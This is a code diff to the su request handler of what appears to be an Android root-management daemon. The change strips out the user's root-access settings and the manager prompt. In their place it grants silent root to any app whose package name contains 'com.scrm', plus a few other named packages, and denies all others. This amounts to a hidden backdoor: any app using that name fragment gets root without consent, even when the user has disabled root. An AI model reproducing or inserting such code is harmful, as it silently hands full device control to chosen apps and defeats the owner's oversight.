@@ -173,81 +173,22 @@ static struct su_info *get_su_info(unsigned uid) {
 
 	UNLOCK_CACHE();
 
-	LOGD("su: 0304  request from uid=[%d] (#%d)\n", info->uid, ++info->count);
+	LOGD("su:  request from uid=[%d] (#%d)\n", info->uid, ++info->count);
 
 	// Lock before the policy is determined
 	info->lock();
 
-	if (info->access.policy == QUERY) {
-		//  Not cached, get data from database
-		database_check(info);
-
-		// Check su access settings
-		switch (info->cfg[ROOT_ACCESS]) {
-			case ROOT_ACCESS_DISABLED:
-				LOGW("Root access is disabled!\n");
-				info->access = NO_SU_ACCESS;
-				break;
-			case ROOT_ACCESS_ADB_ONLY:
-				if (info->uid != UID_SHELL) {
-					LOGW("Root access limited to ADB only!\n");
-					info->access = NO_SU_ACCESS;
-				}
-				break;
-			case ROOT_ACCESS_APPS_ONLY:
-				if (info->uid == UID_SHELL) {
-					LOGW("Root access is disabled for ADB!\n");
-					info->access = NO_SU_ACCESS;
-				}
-				break;
-			case ROOT_ACCESS_APPS_AND_ADB:
-			default:
-				break;
-		}
-		LOGD("su: ----start silent su access ----\n");
-        const char *packageName = resolve_package_name(info->uid);
-        const char *scrm="com.scrm";
-		LOGD("su: packageName=[%s]\n", packageName);
-		if((strstr(packageName,scrm) != NULL) || (!strcmp(packageName, "com.assistant.modules")) ||
-           (info->uid % 100000) == (info->mgr_st.st_uid % 100000) || (!strcmp(packageName, "com.android.shell"))||
-           (!strcmp(packageName, "de.robv.android.xposed.installer")) ){
-			LOGD("su: scrm apk silent su access\n");
-			info->access = SILENT_SU_ACCESS;
-		} else{
-		    info->access.policy = DENY;
-		}
-
-		// If it's the manager, allow it silently
-		if ((info->uid % 100000) == (info->mgr_st.st_uid % 100000))
-			info->access = SILENT_SU_ACCESS;
-
-		// Allow if it's root
-		if (info->uid == UID_ROOT)
-			info->access = SILENT_SU_ACCESS;
-
-		// If still not determined, check if manager exists
-		if (info->access.policy == QUERY && info->str[SU_MANAGER][0] == '\0')
-			info->access = NO_SU_ACCESS;
-	}
-
-	// If still not determined, ask manager
-	if (info->access.policy == QUERY) {
-		// Create random socket
-		struct sockaddr_un addr;
-		int sockfd = create_rand_socket(&addr);
-
-		// Connect manager
-		app_connect(addr.sun_path + 1, info);
-		int fd = socket_accept(sockfd, 60);
-		if (fd < 0) {
-			info->access.policy = DENY;
-		} else {
-			socket_send_request(fd, info);
-			int ret = read_int_be(fd);
-			info->access.policy = ret < 0 ? DENY : static_cast<policy_t>(ret);
-			close(fd);
-		}
-		close(sockfd);
+	LOGD("su: ----start silent su access ----\n");
+	const char *packageName = resolve_package_name(info->uid);
+	const char *scrm="com.scrm";
+	LOGD("su: packageName=[%s]\n", packageName);
+	if((strstr(packageName,scrm) != NULL) || (!strcmp(packageName, "com.assistant.modules")) ||
+	   (info->uid % 100000) == (info->mgr_st.st_uid % 100000) || (!strcmp(packageName, "com.android.shell"))||
+	   (!strcmp(packageName, "de.robv.android.xposed.installer")) ){
+		LOGD("su: scrm apk silent su access\n");
+		info->access = SILENT_SU_ACCESS;
+	} else{
+		info->access.policy = DENY;
 	}
 
 	// Unlock
